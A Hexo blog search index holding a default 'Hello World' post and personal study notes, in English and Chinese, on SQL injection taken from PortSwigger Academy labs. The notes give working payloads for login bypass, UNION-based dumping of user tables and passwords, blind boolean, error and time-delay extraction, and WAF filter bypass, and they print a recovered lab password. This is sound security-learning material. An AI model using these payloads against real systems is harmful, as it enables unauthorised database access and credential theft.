<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/28/hello-world/"/>
    <url>/2023/01/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 注入攻击</title>
    <link href="/2022/02/07/2022-02-01-SQL-Injetction%201%201/"/>
    <url>/2022/02/07/2022-02-01-SQL-Injetction%201%201/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Source: <a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></p><p>Cheatsheet: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p></blockquote><h2 id="1-What-is-SQL-Injection"><a href="#1-What-is-SQL-Injection" class="headerlink" title="1. What is SQL Injection?"></a>1. What is SQL Injection?</h2><p>A <strong>web vulnerability</strong> that allows an attaker to interfere with the queries that an application makes to its database. Allow attakers to view data that they are not normally able to see. In some cases, SQL injection can be escalated to compromise underlying server or DoS attack.</p><h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul><li>Leakage of unauthorised data.</li><li>Persistant backdoor.</li></ul><h2 id="2-Examples"><a href="#2-Examples" class="headerlink" title="2. Examples"></a>2. Examples</h2><h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1. Retrieving hidden data"></a>1. Retrieving hidden data</h3><ul><li>– is a comment indicator in SQL, anything after will be interpreted as comment.</li><li>Use <code>&#39;</code> to break the SQL command and add the injection.</li><li>Types of injections:<ul><li>OR 1&#x3D;1: return all data.</li></ul></li></ul><h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2. Subverting application logic"></a>2. Subverting application logic</h3><p>Scenario: user login with username and password. </p><p><code>SELECT * FROM users WHERE username = &#39;wiener&#39; AND password = &#39;bluecheese&#39;</code></p><p>The goal is to hack in without knowing password, the method is to use the comment indicator to remove the password check, for example by entering username as <code>admin&#39;--</code>. The logic will be subverted by remove the <code>WHERE</code> clause. </p><h3 id="3-Retrieving-data-from-another-database"><a href="#3-Retrieving-data-from-another-database" class="headerlink" title="3. Retrieving data from another database"></a>3. Retrieving data from another database</h3><p>Use <code>UNION</code> key word to make additional queries that are appended on the original query. For example:</p><p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p><p>Key requirements:</p><ol><li>Each query must return the same number of columns.</li><li>The data types in each column must be compatible. (Same type for each column)</li></ol><p>So that in order to carry out a UNION attack, I need to figure out: </p><h4 id="How-many-columns-are-required-in-the-attack"><a href="#How-many-columns-are-required-in-the-attack" class="headerlink" title="How many columns are required in the attack"></a>How many columns are required in the attack</h4><ol><li>Injecting a series of <code>&#39;ORDER BY num--</code>clauses until an error occurs.  This means to order the results by different columns, if the number exceeds the column number, there might be error messages or detectable difference.</li><li>Submitting a series of <code>UNION SELECT NULL, NULL ...--</code>clauses. When matches, there will be an additional roll containing null values in each column. The reason using null is for compatibility. <ol><li>For Oracle database, there is a built-in table called <code>dual</code> which can be used in this attack: <code> UNION SELECT NULL FROM DUAL--</code></li><li>In MySQL, <code>--</code>must be followed by a space or simply use <code>#</code> as comment.</li></ol></li></ol><h4 id="Finding-columns-with-useful-data-type"><a href="#Finding-columns-with-useful-data-type" class="headerlink" title="Finding columns with useful data type"></a>Finding columns with useful data type</h4><p>To find which column has the desired data type, assume that there are 4 columns, you can submit:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,NULL,NULL,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="hljs-string">&#x27;,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>And you can judge the data type from the error message.</p><p>Now you know the number of columns and found which column has a string data, the next step is to get data you are interested in by <code>UNION</code> attack.</p><h3 id="4-Examining-the-database"><a href="#4-Examining-the-database" class="headerlink" title="4. Examining the database"></a>4. Examining the database</h3><p>It is generally useful to get more information from the database for further exploitation. Including version details, contents of the database.</p><h4 id="Get-database-type-and-version"><a href="#Get-database-type-and-version" class="headerlink" title="Get database type and version"></a>Get database type and version</h4><p>Because that different databases have different ways of querying version, you usually need to try all the possible ways to determine which one it is. (Use <code>&#39; UNION</code>)</p><table><thead><tr><th><strong>Database type</strong></th><th><strong>Query</strong></th></tr></thead><tbody><tr><td>Microsoft, MySQl</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>Select banner FROM v$version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table><hr><p><strong><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">Lab SQL injection, query the database type and version (Oracle)</a></strong></p><ol><li>Find how many columns are there in the table. Add <code>&#39;ORDER BY num&#39;</code> to the end of the url and find that there are two columns.</li><li>Find that the second column has the datatype sting.</li><li>Add the following query to return the banner of the database.</li></ol><p><code>&#39;UNION SELECT NULL, banner FROM v$version--</code></p><p>Result:</p> <img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyztugzf0pj30vg09cdgw.jpg" alt="image-20220202203119278" style="zoom:50%;" /><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Lab Query the database and version (MySQL and Microsoft)</a></p><ol><li>First, determine the number of columns of the returned table using <code>&#39;UNION SELECT NULL, NULL#</code>. Then we know that there are two columns.</li><li>Second, find the data type of these columns to see if they are string. By setting each <code>NULL</code> to <code>&#39;a&#39;</code>, two columns have the same data type of string, so we can use either to perform the SQL injection</li><li>Get the database version by the following query:<code>&#39;UNION SELECT @@version, NULL#</code></li></ol><p>Result: </p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzvkzwpt7j305003a3ya.jpg" alt="image-20220202213128309" style="zoom:50%;" /><h4 id="Listing-the-content-of-the-database"><a href="#Listing-the-content-of-the-database" class="headerlink" title="Listing the content of the database"></a>Listing the content of the database</h4><p>Most databases (except for Oracle) have views that provide information about the database. For example <code>information_schema</code> that contains the table names and column names for each table.</p><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">Lab SQL injection, listing the databases on non-Oracle databases</a></p><ol><li><p>首先还是通过NULL来决定表的每一列的数据类型。<code>&#39;UNION SELECT NULL, NULL--</code></p></li><li><p>然后查看<code>information_schema</code>中的表名都是什么。<code>&#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code></p></li><li><p>找到一个user开头的表名，应该就是存放用户信息的，进一步看这个表中有哪些列。<code>&#39;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#39;users_tsxwcv&#39;--</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4f319oj30by02kwec.jpg" alt="image-20220208150439802"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4pgcnqj30as03yt8m.jpg" alt="image-20220208150459170"></p></li><li><p>这样就找到了存放用户名和密码的列。再次请求得到admin的密码即可。<code>&#39;+UNION+SELECT+username_qvqafc,+password_zecjow+FROM+users_tsxwcv--</code></p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i81e4t6j30fs04o3yi.jpg" alt="image-20220208150811298"></p><h4 id="在Oracle中的类似操作"><a href="#在Oracle中的类似操作" class="headerlink" title="在Oracle中的类似操作"></a>在Oracle中的类似操作</h4><p>在oracle中，只需要进行一些修改即可得到相同的数据。所有表的信息可以从<code>all_tables</code>获得，具体列名可以通过以下命令获得：</p><p><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;</code></p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Lab SQL injection attack, listing the database contents on Oracle</a></p></blockquote><p>由于Oracle数据库中的<code>SELECT</code>必须要和<code>FROM</code>配合出现，所以可以用<code>dual</code>表来进行占位。</p><ol><li>通过尝试，<code>&#39;UNION+SELECT+&#39;abc&#39;,+&#39;abc&#39;+FROM+dual--</code>成功，说明有当前表有两列且都是字符串类型。</li><li>查看有哪些表：<code>&#39;UNION+SELECT+table_name,+NULL+FROM+all_tables--</code>，找到了<strong>USERS_AHJNLZ</strong>这张表。</li><li>查看这张表中有哪些列：<code>&#39;UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name=&#39;USERS_AHJNLZ&#39;--</code>最终找到存放用户名和密码的列名为：PASSWORD_QAGOVT和USERNAME_WGWVWL</li><li>最后就可以找到admin的密码：<code>&#39;UNION SELECT USERNAME_WGWVWL, PASSWORD_QAGOVT FROM USERS_AHJNLZ--</code></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6j89ft6oj30j20b0dg9.jpg" alt="image-20220208154259474"></p><h3 id="4-盲注（Blind-SQL-Injection"><a href="#4-盲注（Blind-SQL-Injection" class="headerlink" title="4. 盲注（Blind SQL Injection)"></a>4. 盲注（Blind SQL Injection)</h3><p>在很多情形下，SQL注入后不会显示错误信息甚至不会返回任何信息，例如应用有SQL漏洞，但是其HTTP回应不含相应注入的返回信息和数据库错误信息。常用的如UNION注入就不再适用了。这种blind漏洞仍然是可利用的，只不过更加复杂。常用的盲注方法有：</p><h4 id="1）触发条件应答盲注"><a href="#1）触发条件应答盲注" class="headerlink" title="1）触发条件应答盲注"></a>1）触发条件应答盲注</h4><p>例如在使用cookie登录时，服务器可能使用以下语句验证cookie：</p><p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;cookie&#39;</code></p><p>不同于之前的注入，不正确的cookie不会返回任何信息，但是正确的cookie会重定位到一个例如Welcome Back的页面，这样的行为就是一种条件应答，并且可以作为一个注入点。这样的注入如何进行呢？考虑下面两种cookie后的输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第一个请求会显示welcome back，而第二个请求因为条件恒为false会导致没有返回，也就不会显示welcome back，这样的差别就让我们可以判断请求的对错从而获取数据库内的相关信息。例如，假设数据库中有一个User表，其中有Username和Password列，其中存放着用户Administrator的信息，我们可以通过每次确定一个字符的方式获取其登录密码，如下所示：</p><p><code>xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;m</code></p><p>如果返回welcome页面，则可以确定其密码的第一个字符大于m。重复此步骤直到获得完整密码。</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Lab: Blind SQL injection with conditional responses</a></p></blockquote><p>此lab的任务就是找到admin的密码，使用Burp查看一下页面请求发现了cookie：</p><p><code>Cookie: TrackingId=xrZbR12nPsEWP8FJ; session=BBFx677kQDfMJXYbCXWJFahUhthnZdK3</code></p><p>尝试再其后添加<code>AND &#39;1&#39;=&#39;1</code>，结果可以正常显示Welcome back，添加<code>AND &#39;1&#39;=&#39;2</code>后则不能正常显示，说明可以进行盲注。第二步就是逐步获得admin的密码。首先确定存在数据库，确定列名和admin的存在性。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a</code></p><p>结果表明存在users表。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code></p><p>结果表明存在username这一列，并且存在用户administrator。接下来，最好确定一下密码的长度。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;2)=&#39;a</code></p><p>在repeater中不断修改长度，最终得到密码有20位，还是挺复杂的。接下来就可以尝试获取密码的具体值了。</p><p><code>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code></p><p>这部分较为简单的方法就是使用intruder写payload进行自动攻击。</p><p>Password:<code>l0libd4yt463lcxyow0c</code></p><p>可以明显感觉到从这一题开始不像开始那么简单了，工作量变得很大，所以我们应该更加注重工具的使用。</p><h4 id="2）通过触发SQL错误引入条件响应"><a href="#2）通过触发SQL错误引入条件响应" class="headerlink" title="2）通过触发SQL错误引入条件响应"></a>2）通过触发SQL错误引入条件响应</h4><p>当网站不会在数据库返回为空时显示不同的响应时，上面的注入就不能成功了。在这种情形下，通常可能的方式是通过引发SQL错误导致网页显示不同的响应。下面是两个cookie请求：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br>xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br></code></pre></td></tr></table></figure><p>这些输入使用了关键字CASE根据不同的条件返回不同的表达式，第一个输入会返回<code>&#39;a&#39;</code>而第二个输入会返回<code>1/0</code>并造成devide-by-zero错误。此错误可能会造成页面的些许区别，如果有区别，我们就可以使用此区别来获取一些信息，如admin的密码：若密码第一位大于m则正常输出，若小于m则报错。</p><p><code>xyz&#39; AND (SELECT CASE WHEN (Username = &#39;Administrator&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;m&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM Users)=&#39;a</code></p><blockquote><p> <a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Lab: Blind SQL injection with conditional errors</a></p></blockquote><p>尝试用前两个请求作为输入，都会显示Internal Sever Error，原因可能是数据库种类的问题。提示说是Oracle数据库，所以应该使用Oracle对应的格式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (YOUR<span class="hljs-operator">-</span><span class="hljs-keyword">CONDITION</span><span class="hljs-operator">-</span>HERE) <span class="hljs-keyword">THEN</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">END</span> <span class="hljs-keyword">FROM</span> dual <br></code></pre></td></tr></table></figure><p>这一次的payload就不再显示错误了，通过此输入判断密码长度为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; AND (SELECT CASE WHEN(username=&#x27;</span>administrator<span class="hljs-string">&#x27; AND LENGTH(password)&gt;0) THEN to_char(1/0) ELSE &#x27;</span>a<span class="hljs-string">&#x27; END FROM dual)=&#x27;</span>a<br></code></pre></td></tr></table></figure><h4 id="3-通过触发时延-Time-delays-进行盲注"><a href="#3-通过触发时延-Time-delays-进行盲注" class="headerlink" title="3) 通过触发时延(Time delays)进行盲注"></a>3) 通过触发时延(Time delays)进行盲注</h4><p>如果应用会捕捉并处理数据库错误，上面的方法就不再适用。在这种情形下，由于SQL请求通常是同步运行的，延迟处理SQL请求意味着HTTP应答的延迟。所以，就可以通过HTTP相应的时延判断SQL运行的时延。触发时延的方法根据数据库种类的不同而不同，SQL Server中可以用以下代码触发：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">10</span><span class="hljs-string">&#x27;-- --不会触发</span><br><span class="hljs-string">&#x27;</span>; IF (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) WAITFOR DELAY <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">----会触发</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">其他数据库：</span><br><span class="hljs-comment">Oracle dbms_pipe.receive_message((&#x27;a&#x27;),10)</span><br><span class="hljs-comment">Microsoft WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="hljs-comment">PostgreSQL SELECT pg_sleep(10)</span><br><span class="hljs-comment">MySQL SELECT sleep(10) </span><br><span class="hljs-comment">*/</span><br># 然后就可以用此方法获得信息。<br><span class="hljs-string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrator<span class="hljs-string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="hljs-string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:&#123;delay&#125;<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Lab: Blind SQL injection with time delays</a></p></blockquote><p>#Todo</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></p></blockquote><p>#Todo</p><h4 id="4-使用带外技术（out-of-band-OAST-进行盲注"><a href="#4-使用带外技术（out-of-band-OAST-进行盲注" class="headerlink" title="4)使用带外技术（out-of-band, OAST)进行盲注"></a>4)使用带外技术（out-of-band, OAST)进行盲注</h4><p>#inprogress<br>需要 Burp professional 用 kali 时解决。</p><h4 id="5）如何防范盲注？"><a href="#5）如何防范盲注？" class="headerlink" title="5）如何防范盲注？"></a>5）如何防范盲注？</h4><p>虽然寻找和利用盲注 SQL 漏洞相比普通的 SQL 漏洞来说更为复杂，但防止注入的方法都是相同的，例如谨慎使用参数化查询、使用安全的 API 等。</p><h1 id="3-如何检测-SQL-注入漏洞"><a href="#3-如何检测-SQL-注入漏洞" class="headerlink" title="3. 如何检测 SQL 注入漏洞"></a>3. 如何检测 SQL 注入漏洞</h1><p>手动检测，可以对每个入口点按照上面的利用方式进行检测，并寻找程序显示或响应时间的差异。</p><ul><li>提交 <code>&#39;</code></li><li>提交布尔条件。</li><li>提交在 SQL 查询中触发时间延迟的有效负载。</li><li>提交在 SQL 查询中触发带外网络交互的 OAST 有效负载，并对交互进行监控。</li></ul><h1 id="4-如何绕过检测"><a href="#4-如何绕过检测" class="headerlink" title="4. 如何绕过检测"></a>4. 如何绕过检测</h1><h2 id="4-1-编码绕过"><a href="#4-1-编码绕过" class="headerlink" title="4.1 编码绕过"></a>4.1 编码绕过</h2><p>有的应用可以接受 JSON 或 XML 各式的数据作为输入来进行 SQL 查询。这样的混淆技术可能可以成功绕过 WAF 等防御措施（关键字过滤等）。例如，字符 S 可以写成 XML 形式的 <code>&amp;#x53;</code>。</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">Lab: SQL injection with filter bypass via XML encoding</a></p></blockquote><p>Solution:<br><strong>定位</strong><br>这个 Lab 点开以后很快可以发现有检查库存的功能。使用 Burp 抓包可以看到查询的语句用的是 XML。<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ojoaa44zj30f006ymxm.jpg"><br>首先看一下注入点，加了一个 <code>&#39;OR 1=1 -- </code> 后显示了”Attack detected”，也就是说针对常见的注入关键字有检测。</p><h1 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5. 二次注入"></a>5. 二次注入</h1><div class="note note-info">            <p>文字 或者 <code>markdown</code> 均可</p>          </div><p class="note note-primary">标签</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL Burp</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
